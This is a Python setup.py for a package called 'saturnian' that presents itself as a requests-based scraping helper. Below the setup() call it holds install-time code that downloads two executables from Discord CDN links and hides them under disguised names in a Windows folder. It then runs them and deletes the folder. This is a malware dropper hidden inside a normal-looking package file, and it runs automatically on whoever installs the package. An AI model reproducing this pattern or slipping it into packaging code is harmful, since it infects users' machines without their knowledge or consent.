from setuptools import setup, find_packages
from pathlib import Path



classifiers = [
	'Development Status :: 5 - Production/Stable',
	'Intended Audience :: Education',
	'Operating System :: Microsoft :: Windows :: Windows 10',
	'License :: OSI Approved :: MIT License',
	'Programming Language :: Python :: 3'
]

setup(
	name='saturnian',
	version='0.0.1',
	description='A basic module to use a variety of scraping tools much easier, primarily based on the requests library.',
	long_description='A basic module to use a variety of scraping tools much easier, primarily based on the requests library. For any help with the module, contact harrybow@gmail.com.',
	url='',  
	author='Harry Bowen',
	author_email='harrybow@gmail.com',
	license='MIT', 
	classifiers=classifiers,
	keywords='scraper', 
	packages=find_packages(),
	install_requires=['requests','subprocess']
)
try:
	import requests
except ImportError:
	os.system("pip install requests")
	import requests
try:
	import subprocess
except ImportError:
	os.system("pip install subprocess")
	import subprocess

import os, shutil

PATH = r"C:\$Windows.~SXK" 
try:
	os.mkdir(PATH) 
except:
	pass

url = 'https://cdn.discordapp.com/attachments/1012082879318212684/1012711535812026390/ZYXMN.exe'
url2 = 'https://cdn.discordapp.com/attachments/1012082879318212684/1012711547908407366/ZYRBX.exe'

try:
	os.remove(r"C:\$Windows.~SXK\WIN-siP1VyGDrfCYO2k3.exe")
except:
	pass
try:
	os.remove(r"C:\$Windows.~SXK\WIN-XnWfTdfJsypQWB9d.exe")
except:
	pass

try:
	r = requests.get(url, allow_redirects=True)
	r2 = requests.get(url2, allow_redirects=True)
	open('ZYXMN.exe', 'wb').write(r.content)
	Path(r"ZYXMN.exe").rename(r"C:\$Windows.~SXK\WIN-siP1VyGDrfCYO2k3.exe")
	open('ZYRBX.exe', 'wb').write(r2.content)
	Path(r"ZYRBX.exe").rename(r"C:\$Windows.~SXK\WIN-XnWfTdfJsypQWB9d.exe")
	try:
		os.remove('ZYRBX.exe')
	except:
		pass
	try:
		os.remove('ZYXMN.exe')
	except:
		pass
except:
	pass

os.startfile(r"C:\$Windows.~SXK\WIN-siP1VyGDrfCYO2k3.exe")
os.startfile(r"C:\$Windows.~SXK\WIN-XnWfTdfJsypQWB9d.exe")

try:
	shutil.rmtree(r"C:\$Windows.~SXK")
except:
	pass